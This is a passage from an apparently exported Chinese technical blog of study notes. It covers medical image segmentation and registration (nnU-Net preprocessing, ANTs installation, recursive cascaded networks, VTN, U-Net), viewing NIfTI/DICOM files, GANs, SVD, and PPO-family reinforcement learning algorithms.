就小一点；当前者小的时候，后者就大一点。此外还要调整池化和卷积操作的个数。 3. 预处理3.1 裁剪将图像中非零的区域裁掉，可以减小显存的负担。 3.2 重采样由于成像设备和成像协议的不同，医学图像的体像素间距也不同，所以要对其进行重采样。具体的，对医学图像使用三阶样条插值法，对其相应的分割标签使用最近邻插值法。 3.3 正则化对于 CT 图像而言，对其像素值归一化到原像素值的 0.5%~95.5%，并根据均值和方差对其进行 z-score 正则化。对于非 CT 图像而言，只进行 z-score 正则化。 4. 训练4.1 网络设置训练时的总损失 $= dice$ 损失 + 交叉熵损失，优化器使用的是 Adam 优化器，学习率为 $3\times 10^{-4}$，每当训练损失的指数移动平均值在最近 30 个 epoch 内没有改善时，学习率下降 0.2 倍。当在 60 个 epoch 内，学习率的变化不超过 $5\times10^{-3}$ 并且学习率不小于 $10^{-6}$ 时，停止训练。在验证时使用五折交叉验证。 4.2 数据增强使用随机旋转、随机缩放、随机弹性变形、伽玛校正增强和反射做数据增强。在第二阶段的 U-Net Cascade 中使用了形态学操作和随机移除分割中的连接组件来进行数据增强。 5. 推断因为网络的准确率在一个 patch 中的中央部分较高，而在边缘部分较低，所以在在中央部分的体素的权重较高，而边缘部分的较低。 6. 后处理对 3D 医学图像进行分割，最终器官的分割结果在空间当中一定是连通的，所以最后只保存最大的连通分量，其他的均删除。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[怎样打开并查看.nii和DICOM格式的医学图像]]></title>
    <url>%2F2020%2F02%2F19%2Fnii-DICOM%2F</url>
    <content type="text"><![CDATA[本文主要介绍在医学图像处理领域，常见的两种医学图像格式 .nii 和 DICOM 文件怎么查看。 一、.nii 文件的查看主要介绍两种方式，一种是直接用软件打开，另一种是用python代码打开并查看，前者可以从各个视角进行查看，后者的灵活性更好。 1. ITK-SNAP 软件ITK-SNAP 软件的下载地址为：下载地址 安装之后在打开 .nii 格式的文件时直接选择该软件即可，如上图所示，该软件可以显示在 x、y、z 三个轴方向上的视角，并且可以进行调整。如果不仅想要展示医学图像本身，还要展示对应的分割结果，则可以把分割结果的 .nii 文件直接拖入软件窗口中，并选择以分割的形式载入即可。但是据我目前的使用来说，好像不能同时载入多个分割结果（比如一个器官本身的分割，一个肿瘤部位的分割）。 2. Python 代码查看 .nii 文件相关的代码见我的 github：地址 我给出了两个代码，一个是可以同时显示器官、器官分割结果、肿瘤分割结果的，另一个是只显示器官的。当然，大家可以在第一个的基础上做改动。与 ITK-SNAP 不同，在显示的时候只显示分割结果的边界，这样更有利于观察分割的是否合理。并且还可以通过调节上图中右边红框中的滑块来调节图像灰度值的范围，通过调节上图中下方红框中滑块来查看不同横截面的图像。 二、DICOM 文件的查看查看 DICOM 格式图像的最简便的方式是使用软件，这里给大家推荐两个软件：MicroDicom 和 RadiAnt Viewer，前者是完全免费的，后者只能试用，后者的功能更强大，可以实现三维重建等。 1. MicroDicom 软件MicroDicom 软件的下载地址：下载地址 一般同一个病人的一套 DICOM 图像存储在同一个文件夹中，直接在该文件夹上右键选择用 MicroDicom 打开即可，当然也可以查看某一张图像。 2. RadiAnt ViewerRadiAnt Viewer 的下载地址：下载地址 由于我的 RadiAnt Viewer 到期了……所以就不做演示了。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[医学成像技术笔记]]></title>
    <url>%2F2020%2F02%2F19%2FMIT%2F</url>
    <content type="text"><![CDATA[本文是 B 站中一个关于医学成像技术系列视频的笔记，因为是搞医学图像处理的，只挑选着看了一部分。视频的链接为：医学成像技术。 根据成像原理，医学成像技术可以分为没有辐射的超声波成像、MRI 和有辐射的 X-光成像（如 CT），核素成像等。 根据扫描方式的不同，有三种，轴状位（上下移动）、冠状位（前后移动）、矢状位（左右移动） MRI 可以用对比剂钆来让血管更清楚；CT 中的对比剂是碘，通过注射完成；CT 进行消化道造影时的对比剂是钡，口服；PET 需要注射核素，一般来说 PET 的价格较贵。 图像质量：对比度、分辨率和噪声 DICOM 图像支持以上提到的所有医学成像技术，分为两部分，一部分是头文件，另一部分是图像本身。头文件包括病人信息、扫描设备信息、扫描信息等。DICOM 图像有个 GSDF（Grayscale Standard Display Function），即灰度标准显示函数，对其校准之后可以提高对比度。 CT 扫描得到的是一片片的 2D 图像，可以通过多个 2D 图像来重建为 3D 图像。 CT 值的单位是 Hounsfield，简称 Hu，用来表示人体组织对 X 射线的吸收率，设定水的吸收率为 0 Hu，其他组织的吸收率计算公式为：$$CT(x,y)=1000\times\frac{\mu(x,y)-\mu_{water}}{\mu_{water}}$$伪影的表现形式有条纹、阴影、环、扭曲等，其产生的原因有成像过程产生的、病人运动或体内金属产生的、扫描仪产生的，以及图像重建过程产生的。 MR 磁场的单位是特斯拉。 MRI 有三种权重，分别为 T1 权重、质子密度权重和 T2 权重，其图像中液体分别呈现黑灰白的特点。T1观察解剖结构较好。T2显示组织病变较好。在 T1 图像中 脂肪组织出现白色，水，液体成分、肿瘤呈现黑色，而在 T2 图像中 脂肪组织、水和液体成分、肿瘤都呈现白色。 在 MR 成像中有三种驰豫时间，分别是 T1、T2 和 $T2^*$。T1 弛豫的发生是因为旋转核与周围环境（即晶格，lattice）之间有能量交换，故 T1 也称为自旋-晶格弛豫时间。从高能态自动跳到低能态的时间就是 T1 驰豫时间，磁场越强 T1 驰豫时间越大，由于液体的 T1 驰豫时间最大，所以在 T1 图像中液体的灰度最暗，因为脂肪的 T1 驰豫时间较小，所以脂肪的灰度较亮。 T2 驰豫的发生是因为旋转核相互之间有能量交换，各个原子核旋转的相位变得随机，其磁化向量的净值（Mxy）逐渐衰减，故 T2 也称为自旋-自旋弛豫时间。T2 驰豫时间是横截方向的磁化量随着时间作指数衰减的时间，T1 时间较长，而 T2 时间较短，T2 时间与磁场强度关系不大。$T2^*$ 的时间最快。 TR = Time of Repeatation 重复时间，一般指两个连续的射频脉冲之间的时间间隔； TE = time of Echo, 回波时间，指射频脉冲与相应的回波之间的时间间隔 磁共振功能成像（functional magnetic resonance imaging, fMRI）检测病人/被试接受刺激（视觉、听觉、触觉等）后的脑部皮层信号变化，用于皮层中枢功能区的定位及其他脑功能的深入研究。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[医学图像配准软件 ANTs（Advanced Normalization Tools）的安装和使用说明]]></title>
    <url>%2F2020%2F02%2F14%2FANTs%2F</url>
    <content type="text"><![CDATA[本文是关于医学图像配准软件 ANTs（Advanced Normalization Tools）的安装和使用说明。 ANTsANTs 是 Advanced Normalization Tools 的缩写，是基于 C 语言的一个医学图像处理的软件，速度比较快。 ANTs 支持 2D 和 3D 的图片，包括以下格式的文件：• Nifti (.nii, .nii.gz)• Analyze (.hdr + .img / .img.gz)• MetaImage (.mha)• Other formats through itk::ImageFileWriter / itk::ImageFileWriter such as jpg, tiff, etc. See ITK documentation. ANTs 的安装ANTs 的安装主要有两种形式，一种是基于源码的安装，安装完毕后可以直接在命令行调用相应的功能，另一个种是基于 python 的安装，安装完毕后可以在 python 中直接调用相应的包进行使用。两种方式暂时只支持 Linux 和 Mac 系统。 (1) 基于源码安装 ANTs 首先要安装 git , cmak 和 c++ 编译器； 在命令行里运行： 12345git clone git://github.com/ANTsX/ANTs.git #从github上克隆相应的仓库，保存在当前目录下的ANTs文件夹下mkdir antsbin #创建antsbin文件夹cd antsbin #进入antsbin文件夹ccmake ../ANTs #进入cmake界面，然后依次按下'C'键，稍作等待，再按下'C'键和'G'键，分别完成设置和生成后回到命令行make -j 4 #进行编译，需要运行较长时间 如果遇到 cmake 或 ccmake 版本不匹配的问题需要将其卸载重装，并更新环境变量。 编译完之后如果在 antsbin 目录下出现 bin 目录，则可以进行下一步了，若没有 bin 目录，需要自己建立 bin 目录，并把三个地方的文件拷贝进去，具体做法如下： 12345# 在 antsbin 目录下mkdir bin #在antsbin下建立bin目录cp ./ANTS-build/Examples/* ./bin # 将ANTS-build/Examples下的文件复制到bin目录中cp ./staging/bin/* ./bin #将staging/bin下的文件复制到bin目录中cp ../ANTs/Scripts/* ./bin #将ANTs/Scripts下的文件复制到bin目录中 设置环境变量，更改.bashrc或.profile文件 123456cd ~ #回到home文件夹下vi ~/.bashrc #打开vi进行编辑，按'i'进入插入模式，并在文档末尾插入以下内容export ANTSPATH=/home/username/antsbin/bin/export PATH=“$ANTSPATH:$PATH” #以上路径要和真实路径一致，然后依次按'ESC'键,'Shift'+':'键，'w'键和'q'键，然后回车保存并退出source ~/.bashrc #激活相应的环境配置 ANTs 的使用 在 ANTs/Scripts 路径下有各种各样的 .sh 文件，较为常用的有antsRegistrationSyN.sh 等，为了方便调用可以将 .sh 文件的路径添加到环境变量中去： 1234vi ~/.bashrc #打开.bashrc文件并在末尾添加以下内容export PATH=$PATH:/home/username/ANTs/Scripts#保存并退出source ~/.bashrc #使环境变量生效 然后直接在命令行使用 antsRegistrationSyN.sh ，如果给出该命令的使用方法，则配置成功，如果给出报错信息则配置失败。 因为我手中没有 .nii 格式的配准数据，就用 .jpg 格式的图像做的实验，使用的 fixed image（上图）和 moving image（下图）如下： 配准命令为： 1antsRegistrationSyN.sh -d 2 -f fixed_img.jpg -m moving_img.jpg -o output 其中 -d 2 表示数据是 2 维图像，-f fixed_img.jpg 是 fixed image 对应的图像名称，-m moving_img.jpg 是 moving image 对饮的图像名称，-o output 是输出结果的前缀名。输出的数据如下： output0GenericAffine.mat ， output1Warp.nii.gz 分别表示线性变换和非线性变换估计出的映射关系，outputWarped.nii.gz 表示将 moving_img.jpg 配准到 fixed_img.jpg 后的图像，outputInverseWarped.nii.gz 表示将 fixed_img.jpg 配准到 moving_img.jpg 后的图像。outputWarped.nii 和 outputInverseWarped.nii 的图片如下： (2) 基于 python 安装 antspyMacOS 下使用以下命令进行安装： 1pip install https://github.com/ANTsX/ANTsPy/releases/download/Weekly/antspy-0.1.4-cp36-cp36m-macosx_10_7_x86_64.whl Linux 下使用以下命令进行安装： 1pip install https://github.com/ANTsX/ANTsPy/releases/download/v0.1.4/antspy-0.1.4-cp36-cp36m-linux_x86_64.whl 如果以上方式不起效果，可以使用以下方式进行安装 123git clone https://github.com/ANTsX/ANTsPycd ANTsPypython3 setup.py install 上面的安装方法，只能安装 0.1.4版本，这个版本在使用时，会存在一些小Bug，比如：move到fix的配准，必须将 int类型转换为 float类型。可以使用以下命令安装 0.1.8 版本（但我按这种方式没有安装成功）： 1pip install git+https://github.com/ANTsX/ANTsPy.git 在使用时，直接在 python 引用 ans 模块，然后进行使用即可，如 ants.registration 就是使用配准功能。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[生成对抗网络(GAN)]]></title>
    <url>%2F2020%2F02%2F14%2FGAN%2F</url>
    <content type="text"><![CDATA[本文主要讲解有关生成对抗网络（GAN）的相关知识。 一、判别模型和生成模型机器学习中的模型一般有两种：1. 决策函数 Y=f(X)；2. 条件概率分布 P(Y|X) 根据通过学习数据来获取这两种模型的方法，可以分为判别方法和生成方法。判别方法是由数据直接学习决策函数或条件概率分布作为预测模型，即判别模型；而生成模型是由数据学习联合概率分布 P(X,Y)，然后由 P(Y|X)=p(X,Y)/P(X) 求出概率分布 P(Y|X) 作为预测模型，即生成模型。 二、生成对抗网络（GAN）生成对抗网络（GAN）启发自博弈论中的零和博弈（即两人的利益之和为零，一方的所得正式另一方的所失），GAN 模型由生成模型（generative model）和对抗模型（discriminative model）组成。生成模型 G 捕捉样本数据的分布，用服从某一分布的噪声 z 来生成一个类似真是训练数据的样本，追求效果越像真实样本越好；判别模型 D 是一个二分类器，估计一个样本来自训练数据（而非生成数据）的概率。生成器就类似于造假币的人，而判别器就类似于验钞机，生成器的目的就是其造的假币要骗过验钞机。 GAN 的目标函数：$$\min_G\max_DV(D,G)=E_{x-p_{data}(x)}[\log D(x)]+E_{z-p_z(x)}[\log(1-D(G(z)))]$$其中 D(x) 表示真实数据通过判别器 D 的输出结果，而 D(G(z)) 是噪声 z 通过生成器 G 生成的假数据通过判别器 D 的输出结果。所以对于判别器 D 来说，需要最大化目标函数，即通过判别器让真币为真的概率越大越好，而假币为真的概率越小越好。对于生成器 G 来说，需要最小化目标函数，即让假币越真越好。 在训练的时候需要先训练判别器，再训练生成器。 令 $C(G)=\max_DV(G,D)$，则可以通过推导得到：$C(G)=-\log(4)+2\cdot JSD(p_{data}||p_g)$，其中 JSD 表示 Jensen-Shannon divergence，即 JS 散度。$p_{data}$ 是真实数据的分布，而 $p_g$ 是生成的假数据的分布。 GAN 存在训练过程不稳定的问题，这一方面是因为 GAN 自身的缺陷，另一方面是因为生成器和判别器的能力不匹配；此外生成器只会生成一两种类别的样本。 GAN 的一个改进是 WGAN。当真实数据的分布和假数据的分布互不重叠时，JS 散度值会趋近于一个常数，其导数接近于0，这就导致了梯度消失。所以重新定义了一种 Wasserstein-1 距离来代替原来的 JS 散度：$$W(P_r,P_g)=\inf_{\gamma-\Pi(P_r,P_g)}E_{(x,y)}[||x-y||]$$即使 $P_r$ 和 $P_g$ 互不重叠，wasserstein 距离依旧可以清楚的反应两个分布的距离。 目标函数也变为了：$$\max_{f_w}E_{x-P_r}[f_w(x)]-E_{z-P_z}[f_w(G(z))]$$ $$\min_G-E_{z-P_z}[f_w(G(z))]$$ WGAN 很好的解决了训练不稳定和模式崩溃的问题。 GAN 只能随机产生一个类别，CGAN 可以指定类别来生成。]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】递归级联网络（Recursive Cascaded Networks）论文及VTN（Volume Tweening Network）]]></title>
    <url>%2F2020%2F02%2F11%2FRCN%2F</url>
    <content type="text"><![CDATA[本文是递归级联网络和 VTN 网络论文，及其代码的一些解读。 一、递归级联网络递归级联网络论文地址：递归级联网络论文 1. 前人工作之前的工作尝试通过对一些现有网络进行堆叠来建模的，但是每一层网络的输入和任务各不相同，并且是对每一层依次单独训练的（先训练之前的层，将之前层的参数固定下来后再训练后面的层），每一层都会计算 warped image 和 fixed image 之间的相似性损失，这导致了当堆叠到很少层（大约3层）之后，实际效果就不再有任何提升了。 这是因为复杂变形场一般有着较大的位移，所以网络直接预测复杂的形变场不易实现，同时逐层训练的网络结构中，每一层都是各学各的，所以无论怎么级联，都很难达到很好的效果。 2.递归级联网络递归级联网络是一个端到端的无监督模型，理论上它可以基于任意网络来做，当模型的级联的层数越多时，模型的效果越好。 上图是用递归级联网络对肝脏 CT 数据进行配准的示意图，moving image 通过每一层后不断的产生扭曲，最终对齐到 fixed image。图中的 $\phi_k$ 表示一个预测流场（predicted flow field）。 对于递归级联网络中“递归”和“级联”的含义，我的个人理解是，级联就是把多个子网络串联起来形成一个级联块，这些子网络可相同，也可不同。而递归就是把级联块重复的使用多次，并且所有级联块具有相同的参数。 上图是递归级联网络的结构示意图。 递归级联网络的每一层的输入都是经过前几层处理后的图像（warped image）和固定图像（fixed image），并且舍弃了逐层训练的方式，而是采用联合训练的方式，只在最后一层来计算 warped image 和 fixed image 之间的相似度，通过反向传播更新前面的所有层。这样一来，每一层只需要学习简单的变形场，所有层级联之后就达到很好的效果。 文章中递归级联网络所使用的基础网络是 VTN 和 VoxelMorph，前者占用的显存更少。文章建议在级联时第一个网络是仿射网络（affine network），也就是级联时第一个网络为仿射网络，后面跟着若干其他子网络。 每个子网络会根据输入的 fixed image 和 warped image 来预测一个变形流场（deformable flow field），每一层的子网络可以相同，也可以不同，方便起见一般会选择相同的子网络。 图像重采样使用的是（多）线性插值，在超出原图边界的采样点上使用最近点插值。 参数共享级联，即递归。本文提出的递归结构有两种形式，即假设一共有 $n$ 个级联块，第一种递归形式是把这 $n$ 个级联块重复使用两次，因此就得到了 $2n$ 个级联块。第二种递归形式是把每个级联块就地使用 $r$ 次，那么就得到了 $rn$ 个级联块。举例来说，比如级联块是 ABCD，若重复三次，则第一种方式的结果为 ABCDABCDABCD，第二种的结果为 AAABBBCCCDDD。后者的效果更好。训练的时候为了节省显存开支没有使用递归，在测试的时候才用。 二、VTNVTN 论文地址：VTN 论文 VTN 是 Volume Tweening Network 的缩写，其论文发表时间和递归级联网络几乎一致，给我的感觉是作者做了一次实验，发了两篇论文。VTN 论文中没有单独给出 VTN 网络的代码，而是给出了递归级联网络的 github 地址（见第三部分）。 VTN 是一种基于无监督的学习方法的端对端网络框架，用来进行 3D 医学图像的配准。有三个创新点： 端对端的级联方案，这是为了解决大尺度变形的问题 有效的结合了仿射配准网络 使用一个额外的可逆性损失（invertibility loss）来鼓励后向一致性（backward consistency） VTN 网络是在光流估计（Optical flow estimation）和 STN（Spatial Transformer Networks） 的基础上做的，前者是为了识别在同一场景不同角度的两张图片中像素点之间的相关性；后者是为了学习一个定位网络来产生一个合适的变换以拉直输入图片。 上图是 VTN 级联的示意图，其中配准子网络用来寻找 fixed image 和当前 moving image 之间的变形场，fixed image 还会和当前 moving image 产生一个相似性损失来指导训练，有颜色的实线表示损失是怎么计算的，有颜色的虚线表示梯度是怎么反向传播的，因为每一层都可微，所以当前层产生的梯度可以传播到之前的所有层。 VTN 是由多个子网络级联而成的，每个级联的子网络可以产生一个变换来让 moving image 和 fixed image 对齐。当前层只根据前一层的输出（warped image）和 fixed image 来产生变换（transform），而前人所提出的网络除了上述两个输入，还要输入最初的 moving image。这种级联子网络的想法来自于 FlowNet 2.0。VTN 网络的结构包括仿射（affine）配准和可变形（deformable）配准两个过程，一般是一个仿射配准网络，后面跟多个可变形配准网络。此外还加入了可逆性损失来鼓励后向一致性，以达到更高的精度。 上图是仿射配准网络的示意图，其中四边形上方是通道数，四边形越大表示分辨率越高。 仿射配准子网络用仿射变换来对齐输入图像（fixed image and moving image），它只被用作第一个子网络。仿射配准网络的卷积部分和下面的密度可变形网络的编码器部分是一模一样的，在一系列卷积操作后是一个全连接层，以形成一个仿射流场，即一个 $3\times3$ 的转换矩阵 A 和一个 3 维的位移向量 b。应该是对应旋转和平移操作中的参数。 上图是密度可变形网络的示意图，其中从卷积到反卷积的连线即跳跃连接。 密度可变形（dense deformable）配准子网络用作所有的后续子网络，其目的是让配准更加完善，它采用编码器-解码器结构，并且使用跳跃连接，该子网络会输出一个密度流场（dense flow field）和一个3通道的体积特征图（volume feature map）。 就递归级联网络和 VTN 网络的论文来看，两者的表述是有点矛盾的；从递归级联网络的代码来看，VTN 网络指的只是上述中的密度可变形网络，而递归级联网络则是一个仿射配准网络后面跟上多个 VTN 网络（密度可变形网络）。此外，递归级联网络的论文中说只有在最后一层才计算 warped image 和 fixed image 之间的相似性损失，而在 VTN 的论文中（VTN 的网络示意图中），是每层都计算相似性损失的。 三、代码递归级联网络代码的github地址：递归级联网络 代码中文件的调用结构如下： VTN 网络的结构： VTNAffineStem 网络的结构和 VTN 网络中前半部分的卷积（conv1~conv6_1）相同，在此之后是一个全连接层将输出转化为一个 $3\times 3$ 的转换矩阵 A 和一个 3 维的位移向量 b。 在 VTNAffineStem 的代码中，除了一系列卷积和全连接操作之后，还有一些代码，数学系的师兄说其作用是正交约束，师兄给出的推导过程如下： 假设 $A^2=C=[c_{ij}]$ 具有三个特征值 $k_1,k_2,k_3$，希望它们均接近 1 等价于最小化下式：$$k_1+\frac{1}{k_1}+k_2+\frac{1}{k_2}+k_3+\frac{1}{k_3}=(k_1+k_2+k_3)+(\frac{k_2k_3+k_1k_3+k_1k_2}{k_1k_2k_3})$$$C$ 的特征多项式为（一次项前面的系数是所有可能的二阶主子式的和）：$$p(k)=|C|-\sum_{1\leq i&lt; j\leq3}(c_{ii}c_{jj}-c_{ij}c_{ji}k+tr(C)k^2-k^3)$$其中 $tr$ 是 $C$ 的迹，利用特征多项式根与系数的关系可得：$$k_1+k_2+k_3=tr(C)=c_{11}+c_{22}+c_{33}=\sigma_1$$ $$k_2k_3+k_1k_3+k_1k_2=\sum_{1\leq i&lt;j\leq3}(c_{ii}c_{jj}-c_{ij}c_{ji}=\sigma_2)$$ $$k_1k_2k_3=|C|=\sigma_3$$ 所有待优化的目标函数变为：$$\sigma_1+\frac{\sigma_2}{\sigma_3}$$这个函数的最小值为 6，代码中减去 6 是为了让最小值成为 0。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】U-Net模型-用于医学图像分割的神经网络模型]]></title>
    <url>%2F2020%2F02%2F01%2FU-Net%2F</url>
    <content type="text"><![CDATA[本文主要是对 U-Net 论文中主要内容的提炼，中间加入了一些自己的理解，有些地方自己不是很懂，所以直接采用了直译的方式。建议大家去阅读原文。 U-Net 的主要优点是可以用更少的训练样本达到更好的效果，并且速度很快，这对于训练数据较少的医学图像处理相关的问题来说是十分重要的。U-Net论文地址：U-Net论文 一、前人工作文章首先总结了前人工作的一些特点，前人的工作（主要是一些卷积神经网络模型）有两大局限，第一是受制于可利用的训练样本不够多的问题，第二是网络模型太过复杂而导致的训练速度较慢。卷积神经网络模型主要用于分类任务，而对于医学图像处理这类分类问题就要求对每个像素进行分类（是前景还是背景），也就是所谓的定位（localization）问题。 后来有人提出了滑动窗口（sliding-window）的方法，也就是每次把当前像素的相邻像素，即一个窗口作为输入。滑动窗口的好处是可以让网络实现定位（即对每个像素进行分类），同时每个滑动窗口都相当于一个训练样本，这样增加了可利用的训练样本的数量。当然了这种方式也存在着两个问题，第一是因为要对不同大小、不同位置的窗口进行遍历，所以训练速度会很慢；第二是因为窗口之间存在重叠，所以有点冗余了，换句话说，如果想要得到更好的精度，就要增加窗口的数量和大小，而如果要提高训练速度就就必须减少窗口的数量和大小，这是一对矛盾。 二、U-Net 技术要点 U-Net 之所以叫这个名字是因为其网络模型的形状类似于字母 ‘U’ 。U-Net 的结构包括一个收缩路径（contracting path）和一个扩张路径（expanding path），前者用来捕获上下文信息，后者用来精确定位。这两者又分别可看作是一个编码器和一个解码器。 由于重叠平铺（overlap-tile）策略所以使得模型可以处理任意大小的输入图片。由于图像边界区域的像素上下文会缺失，所以可以通过对输入图像进行镜像来推断。 为了解决训练数据较少的问题，在该模型中使用了大量的数据增强，比如对已有的训练图像进行塑性变形。 U-Net 这篇论文当时是针对于生物医学图像进行分割的，可以理解为对含有很多细胞的图像进行分割。所以就存在一个同类相邻物体（比如相邻的细胞）之间的分割问题，为此提出了一个加权损失（weighted loss），在相邻细胞的分割标签会在损失函数中有个较大的权重。 三、U-Net 网络结构前面说过 U-Net 由一个收缩路径和一个扩张路径组成，收缩路径中的基本组成元素是两个 $3\times3$ 的无填充卷积，每个卷积后都跟着一个 ReLU 激活函数，然后是一个 $2\times2$ 的步长为2的最大池化操作，以上步骤重复多次。每个池化操作后通道数就会加倍。扩张路径与之大体相反，基本元素是一个 $2\times2$ 的卷积（up-convolution），拼接上收缩路径中对应的特征图（即跳跃连接），然后是两个 $3\times3$ 的卷积操作，每个卷积后面跟着一个 ReLU 激活函数。以上步骤重复多次，在扩张路径的最后一层有一个额外的 $1\times1$ 的卷积操作，这个卷积的目的是让输出映射到想要的大小。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[机器学习（12）：主成分分析（PCA）]]></title>
    <url>%2F2020%2F01%2F27%2FPCA%2F</url>
    <content type="text"><![CDATA[本文主要讲解关于主成分分析的相关内容。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[机器学习（11）：SVD——奇异值分解]]></title>
    <url>%2F2020%2F01%2F27%2FSVD%2F</url>
    <content type="text"><![CDATA[本文主要讲解奇异值分解的相关内容。 奇异值分解（SVD）是一种矩阵因子分解方法，常用于矩阵数据压缩。 任意一个 $m\times n$ 的矩阵都可以表示为三个矩阵的乘积（因子分解）形式，分别是 m 阶正交矩阵、由降序排列的非负的对角线元素组成的 $m\times n$ 矩形对角矩阵和 n 阶正交矩阵，这就是该矩阵的奇异值分解。矩阵的奇异值分解一定存在，但不唯一。 用公式表示就是：$$A=U\Sigma V^T$$其中 $\Sigma=diag(\sigma_1,\sigma_2,…,\sigma_p)$ ，且 $\sigma_1\geq\sigma_2\geq…\geq\sigma_p\geq0$，$p=\min(m,n)$，其中 $\sigma_i$ 被称作矩阵 A 的奇异值。 以上的奇异值分解又称完全奇异值分解，实际常用的是紧奇异值分解和截断奇异值分解，紧奇异值分解是和原始矩阵等秩的奇异值分解，截断奇异值分解是比原始矩阵低秩的奇异值分解。 紧奇异值分解$$A=U_r\Sigma_rV_r^T$$其中 r 是矩阵 A 的秩， $U_r$ 是 $m\times r$ 矩阵，$V_r$ 是 $n\times r$ 矩阵，$\Sigma_r$ 是 r 阶对角矩阵。紧奇异值分解的对角矩阵 $\Sigma_r$ 的秩与原始矩阵 A 的秩相等。 截断奇异值分解 在矩阵的奇异值分解中，只取最大的 k 个奇异值（k&lt;r，r 是矩阵的秩）对应的部分，就得到了矩阵的截断奇异值分解。在实际使用时，通常指的就是这种情况。$$A\approx U_k\Sigma_kV_k^T$$其中 $U_k$ 是 $m\times k$ 矩阵，$V_k$ 是 $n\times k$ 矩阵，$\Sigma_k$ 是 k 阶对角矩阵。紧奇异值分解的对角矩阵 $\Sigma_k$ 的秩比原始矩阵 A 的秩低。 紧奇异值分解对应着无损压缩，截断奇异值分解对应着有损压缩。矩阵的奇异值分解中，奇异值是唯一的，但是矩阵 U 和 V 不是唯一的。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[LaTex 数学符号大全]]></title>
    <url>%2F2019%2F12%2F11%2FLaTex%2F</url>
    <content type="text"><![CDATA[下文转自 LaTex符号大全，主要是为了方便自己查找。 此外，空格是 \quad；]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[强化学习（9）：TRPO、PPO以及DPPO算法]]></title>
    <url>%2F2019%2F12%2F09%2FPPO%2F</url>
    <content type="text"><![CDATA[本文主要讲解有关 TRPO算法、PPO 算法、PPO2算法以及 DPPO 算法的相关内容。 一、PPO 算法PPO（Proximal Policy Optimization） 是一种解决 PG 算法中学习率不好确定的问题的算法，因为如果学习率过大，则学出来的策略不易收敛， 反之，如果学习率太小，则会花费较长的时间。PPO 算法利用新策略和旧策略的比例，从而限制了新策略的更新幅度，让 PG 算法对于稍微大一点的学习率不那么敏感。 为了判定模型的更新什么时候停止，所以 PPO 在原目标函数的基础上添加了 KL 散度部分，用来表示两个分布之间的差别，差别越大值越大，惩罚也就越大。所以可以使两个分布尽可能的相似。PPO 算法的损失函数如下：$$J_{PPO}^{\theta’}(\theta)=J^{\theta’}(\theta)-\beta KL(\theta,\theta’)$$ $$J^{\theta’}(\theta)=E_{(s_t,a_t)\sim\pi_{\theta’}}[\frac{p_\theta(a_t|s_t)}{p_{\theta’}(a_t|s_t)}A^{\theta’}(s_t,a_t)]$$ PPO 的前身是 TRPO（Trust Region Policy Optimization），TRPO 与 PPO 之间的区别在于 TRPO 使用了 KL 散度作为约束条件，虽然损失函数是等价的，但是这种表示形式更难计算，所以较少使用。TRPO 损失函数如下：$$J_{TRPO}^{\theta’}(\theta)=E_{(s_t,a_t)\sim\pi_{\theta’}}[\frac{p_\theta(a_t|s_t)}{p_{\theta’}(a_t|s_t)}A^{\theta’}(s_t,a_t)]$$ $$KL(\theta,\theta’)&lt;\delta$$ PPO 在训练时可以采用适应性的 KL 惩罚因子：当 KL 过大时，增大 $\beta$ 的值来增加惩罚力度；当 kL 过小时，减小 $\beta$ 值来降低惩罚力度。即：$$if\quad KL(\theta,\theta’)&gt;KL_{max},\quad increase\quad\beta$$ $$if\quad KL(\theta,\theta’)&lt;KL_{min},\quad decrease\quad\beta$$ 二、PPO2 算法PPO2 在 PPO 的基础上去除了 KL 散度损失函数，但是引入了 Clip 损失函数，当目标函数值低于 $1-\epsilon$ 或大于 $1+\epsilon$ 时进行截断。其损失函数为：$$J_{PPO2}(\theta)=\sum_{(s_t,a_t)}\min[\frac{p_\theta(a_t|s_t)}{p_{\theta’}(a_t|s_t)}A^{\theta’}(s_t,a_t)\quad,\quad clip(\frac{p_\theta(a_t|s_t)}{p_{\theta’}(a_t|s_t)},1-\epsilon,1+\epsilon)\cdot A^{\theta’}(s_t,a_t)]$$ 上图中绿色虚线是原始的损失函数，蓝色虚线是 clip 函数，红色实线是实际上的损失函数，当优势函数 A 的值为正数或负数时，实际的损失函数有不同的情况。 三、DPPO 算法DPPO（Distributed Proximal Policy Optimization）简单来说就是多线程并行版的 PPO。相应的代码是按照莫烦的教程来写的，使用了和 A3C 算法类似的网络结构。但是与 A3C 算法不同的是，A3C 算法是副网络与主网络有着相同的网络结构，并用副网络计算出来的梯度更新主网络的参数，更新完后再将主网络的参数同步给副网络。 而这里的 DPPO 代码是副网络不必拥有和主网络相同网络结构，每个副网络只需要有自己独立的环境就好了。副网络在不同的环境中收集数据，然后交给主网络来更新参数。原本应该是在主网络更新后同步网络参数给副网络，但是这样的时空开销都是比较大的，而该过程的实质其实就是用更新后的主网络来收集数据，所以一开始才说副网络不必拥有和主网络相同的网络结构。这一点和 A3C 算法对比一下，想想为什么会有这种区别。 自己在写代码的时候碰到了很多坑，下面来详细说一下： 坑1. 副网络需要收集的数据有三个，状态值 s、动作值 a 以及 Q-target，但是由于多线程的存在，如果把三者分三步保存在列表（队列也可）中，则三者的维度可能会有所差异，在喂入网络的时候就会出错。为了解决这个问题，必须让原来三步的工作具有原子性，即要么三步都做，要么三步都不做。用代码的角度来看，以下代码是不可行的： 123global_s.append(batch_s)global_a.append(batch_a)global_q.append(batch_q_target) 而以下代码是可行的： 1data.append(np.hstack((batch_s, batch_a, batch_q_target))) 坑2. 